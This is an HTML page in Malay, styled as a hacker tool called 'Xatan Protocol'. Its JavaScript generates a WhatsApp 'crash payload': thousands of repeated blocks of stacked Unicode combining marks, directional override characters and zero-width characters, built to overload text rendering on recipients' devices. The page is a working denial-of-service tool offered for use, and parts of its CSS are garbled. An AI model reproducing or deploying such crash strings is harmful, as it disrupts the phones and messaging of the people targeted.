<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xatan Protocol // Heavy Payload</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@500;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #1a0a0f;
            --accent-red: #ff0040;
            --accent-red-dim: #990020;
            --accent-cyan: #00ffff;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --border-color: #330011;
        }

        html, body {
            margin: 0;
            padding: 0;dth: 100%;
            height: 100%;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Rajdhani', sans-serif;
            overflow-x: hidden;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255, 0, 64, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 0, 64, 0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -2;
            animation: grid-move 20s linear infinite;
        }

        @keyframes grid-move {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }
        
        .vignette {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            box-shadow: inset 0 0 200px #000;
            z-index: -1;
            pointer-events: none;
        }

        .container {
            width: 90%;
            max-width: 850px;
            background: linear-gradient(145deg, var(--bg-secondary), #0f0507);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 40px;
            bdow: 
                0 0 40px rgba(255, 0, 64, 0.3),
                inset 0 0 15px rgba(255, 0, 64, 0.1);
            position: relative;
            overflow: hidden;
        }

        .corner::before, .corner::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            border-color: var(--accent-red);
            border-style: solid;
            z-index: 10;
        }
        .corner.top-left::before { top: 5px; left: 5px; border-width: 2px 0 0 2px; }
        .corner.top-right::after { top: 5px; right: 5px; border-width: 2px 2px 0 0; }
        .corner.bottom-left::before { bottom: 5px; left: 5px; border-width: 0 0 2px 2px; }
        .corner.bottom-right::after { bottom: 5px; right: 5px; border-width: 0 0 2px 2px; }

        .header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }
        
        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5em;
            font-weight: 700;
            color: var(--accent-red);
            text-transform: uppercase;
            letter-spacing: 4px;
            margin: 0;
            text-shadow: 0 0 10px var(--accent-red-dim);
            animation: pulse-glow 2s infinite alternate;
        }

        @keyframes pulse-glow {
            from { text-shadow: 0 0 10px var(--accent-red-dim); }
            to { text-shadow: 0 0 20px var(--accent-red), 0 0 30px var(--accent-red-dim); }
        }
        
        .head
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.1em;
            color: var(--accent-cyan);
            margin-top: 10px;
            letter-spacing: 2px;
        }

        .output-area {
            position: relative;
            margin-bottom: 25px;
        }
        
        .output-area textarea {
            width: 100%;
            height: 280px;
            background-color: rgba(10, 10, 10, 0.7);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--accent-cyan);
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.9em;
            padding: 15px;
            resize: vertical;
            box-sizing: border-box;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        
        .output-area textarea:focus {
            outline: none;
            border-color: var(--accent-red);
            box-shadow: 0 0 15px rgba(255, 0, 64, 0.4);
        }

        .generate-btn {
            display: block;
            width: 60%;
            margin: 0 auto;
            padding: 15px 20px;
            background: linear-gradient(145deg, var(--accent-red), var(--accent-red-dim));
            border: none;
            border-radius: 4px;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.3em;
            font-weight: 600;
            color: var(--bg-primary);
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: transfs, box-shadow 0.2s, background 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .generate-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .generate-btn:hover::before {
            left: 100%;
        }
        
        .generate-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(255, 0, 64, 0.4);
            background: linear-gradient(145deg, #ff1a59, #b3001a);
        }

        .warning {
            text-align: center;
            margin-top: 25px;
            font-family: 'Share Tech Mono', monospace;
            color: var(--text-secondary);
            font-size: 0.9em;
        }
        .warning strong {
            color: var(--accent-red);
            font-weight: 600;
        }
        
        @keyframes glitch {
            0%, 100% { text-shadow: 0.05em 0 0 var(--accent-red), -0.05em -0.025em 0 var(--accent-cyan), 0.025em 0.05em 0 #ffff00; }
            15% { text-shadow: 0.05em 0 0 var(--accent-red), -0.05em -0.025em 0 var(--accent-cyan), 0.025em 0.05em 0 #ffff00; }
            16% { text-shadow: -0.05em -0.025em 0 var(--accent-red), 0.025em 0.025em 0 var(--accent-cyan), -0.05em -0.05em 0 #ffff00; }
            49% { text-shadow: -0.05em -0.025em 0 var(--accent-red), 0.025em 0.025em 0 var(--accent-cyan), -0.05em -0.05em 0 #ffff00; }
            50% { text-shadow: 0.025em 0.05em 0 var(--accent-red), 0.05em 0 0 var(--accent-cyan), 0 -0.05em 0 #ffff00; }
            99% { text-shadow: 0.025em 0.05em 0 var(--accent-red), 0.05em 0 0 var(--accent-cyan), 0 -0.05em 0 #ffff00; }
        }
        .header h1:hover { animation: glitch 1s infinite; }

    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="vignette"></div>
    <div class="container corner top-left corner top-right corner bottom-left corner bottom-right">
        <div class="header">
            <h1>Xatan Protocol</h1>
            <p>Heavy Render Engine // Crash Payload</p>
        </div>
        <div class="output-area">
            <textarea id="crashPayload" readonly placeholder="[SYSTEM_READY] // Tekan butang untuk memulakan protokol..."></textarea>
        </div>
        <button class="generate-btn" onclick="generateWhatsAppCrashText()">JANA PAYLOAD âš¡</button>
        <p class="warning"><strong>Amaran:</strong> Payload ini direka untuk membebankan pemprosesan teks. Keberkesanan bergantung pada peranti.</p>
    </div>

    <script>
        function generateWhatsAppCrashText() {
            let payload = "";
            
            // Kumpulan aksara yang sangat berat untuk diprosess pada combining marks dan aksara kawalan arah yang melampau
            const rtl = "\u202E";
            const ltr = "\u202D";
            const popd = "\u202C";
            const zwj = "\u200D";
            const zwnj = "\u200C";
            
            // Kombinasi combining marks yang sangat padat dan menyebabkan isu render
            const heavyCombining = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F\u0310\u0311\u0312\u0313\u0314\u0315\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F\u0320\u0321\u0322\u0323\u0324\u0325\u0326\u0327\u0328\u0329\u032A\u032B\u032C\u032D\u032E\u032F\u0330\u0331\u0332\u0333\u0334\u0335\u0336\u0337\u0338\u0339\u033A\u033B\u033C\u033D\u033E\u033F\u0340\u0341\u0342\u0343\u0344\u0345\u0346\u0347\u0348\u0349\u034A\u034B\u034C\u034D\u034E\u034F\u0350\u0351\u0352\u0353\u0354\u0355\u0356\u0357\u0358\u0359\u035A\u035B\u035C\u035D\u035E\u035F\u0360\u0361\u0362\u0363\u0364\u0365\u0366\u0367\u0368\u0369\u036A\u036B\u036C\u036D\u036E\u036F\u0489\uFE20\uFE21\uFE22\uFE23\uFE24\uFE25\uFE27\uFE28\uFE29";
            
            // Simbol-simbol yang menyebabkan konflik arah dan paparan
            const directionalSymbols = "\u0600\u0601\u0602\u0603\u0604\u06DD\u070F\u115F\u1160\u17B4\u17B5\u180B\u180C\u180D\u180E\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\uFFF9\uFFFA\uFFFB";

            // Satu blok aksara yang sangat berat. Kita akan ulang blok ini.
            const heavyBlock = rtl + "Xatan NeverDie" + heavyCombining + zwj + zwnj + directionalSymbols + "âš¡ðŸ’¥" + ltr + popd + " ";

            // Kurangkan bilangan ulangan untuk mengelakkan halaman web hang, tetapi tingkatkan ketumpatan setiap blok
            const numBlocks = 5000; // Bilangan yang seimbang
            
            // Guna async untuk mengelakkan halaman web freeze semasa proses janaan
            setTimeout(() => {
                for (let i = 0; i < numBlocks; i++) {
                    payload += heavyBlock;
                }
                
                // Tambah lapisan akhir yang sangat berat
                payload += "\n\n" + rtl + zwj.repeat(100) + heavyCombining.repeat(50) + "Xatan NeverDie" + zwnj.repeat(100) + ltr + heavyCombining.repeat(50) + "âš¡ðŸ’¥" + popd + directionalSymbols;

                // Masukkan ke dalam textarea
                document.getElementById('crashPayload').value = payload;
            }, 100); // Tangguh 100ms untuk memastikan UI responsif
        }
    </script>
</body>
</html>
